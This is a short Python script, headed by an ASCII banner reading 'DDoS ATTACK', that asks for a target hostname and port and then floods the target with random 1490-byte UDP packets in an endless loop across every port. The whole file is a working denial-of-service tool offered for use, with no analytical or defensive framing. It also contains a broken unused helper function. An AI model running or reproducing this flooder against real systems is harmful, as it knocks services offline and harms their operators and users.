import sys
import os

import time
import socket
import random
from datetime import datetime

def buildblock(size):
	out =''
	for i in range(0, size):
		a = random.randint(65, 90)
		out += char(a)
print("""
 _____   _____          _                     
(____ \ (____ \        | |                    
 _   \ \ _   \ \ ___    \ \                   
| |   | | |   | / _ \    \ \                  
| |__/ /| |__/ / |_| |____) )                 
|_____/ |_____/ \___(______/                  
                                              
        _______ _______         ______ _    _ 
   /\  (_______|_______)  /\   / _____) |  / )
  /  \  _       _        /  \ | /     | | / / 
 / /\ \| |     | |      / /\ \| |     | |< <  
| |__| | |_____| |_____| |__| | \_____| | \ \ 
|______|\______)\______)______|\______)_|  \_)
""")
                                              
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
print('[--]Starting Script')
print('[×]')
IP = input('[-]Enter target hostname:')
ip = socket.gethostbyname(IP)
print ('Starting scan on host: ', ip)
print('[×]')
print('[×]')
port = int(input('[-]Enter port:'))
print('[×]')
print('[-]Starting DDoS Attack')
sent = 0
while True:
	sock.sendto(bytes, (ip,port))
	sent = sent+1
	port = port+1
	print("[-]Sent %s packet to %s throught port:%s"%(sent,ip,port))
	if port == 65534:
		port =1